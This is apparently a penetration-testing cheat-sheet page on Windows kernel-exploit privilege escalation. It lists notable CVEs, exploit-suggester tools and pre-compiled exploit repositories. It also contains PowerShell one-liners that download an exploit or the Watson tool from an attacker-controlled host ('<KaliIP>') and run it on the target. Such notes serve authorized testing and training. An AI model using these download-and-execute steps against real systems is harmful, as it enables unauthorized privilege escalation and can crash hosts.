---
tags:
  - Advanced
  - Binary_Exploitation
  - Exploitation
  - Privilege_Escalation
  - Windows
---

## Kernel Exploitation
resources: [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) | [Pre-compiled Exploits](https://github.com/SecWiki/windows-kernel-exploits)

> [!danger] **Last resort** - kernel exploits can BSOD the system. Always try misconfigurations first.

### Analyze WES Output
> [!info] **WES** outputs CVEs with available exploits. Search for pre-compiled binaries or compile from source.

```bash
# Common high-value CVEs to look for
# CVE-2021-1732 - Win32k (Windows 10)
# CVE-2020-0787 - BITS (Windows 7-10)
# CVE-2019-1388 - UAC Bypass (Windows 7-10)
# CVE-2018-8120 - Win32k (Windows 7, Server 2008)
# CVE-2017-0213 - COM Aggregate Marshaler (Windows 10)
# CVE-2016-3309 - Win32k (Windows 7-10)
# CVE-2015-1701 - Win32k (Windows 7)
```

### Download and Execute Exploit [Remote]
```powershell
# Download pre-compiled exploit
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/<ExploitName>.exe','exploit.exe')

.\exploit.exe
```

### Common Exploit Repositories [Local]
```bash
# SecWiki collection (pre-compiled)
git clone https://github.com/SecWiki/windows-kernel-exploits

# Search for specific CVE
find /opt/windows-kernel-exploits -name "*<CVE>*"
```

### Watson - .NET Exploit Suggester [alternative]
> [!tip] Runs directly on target, no need to transfer systeminfo. Requires .NET 4.5+.

```powershell
(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/Watson.exe','watson.exe')
.\watson.exe
```
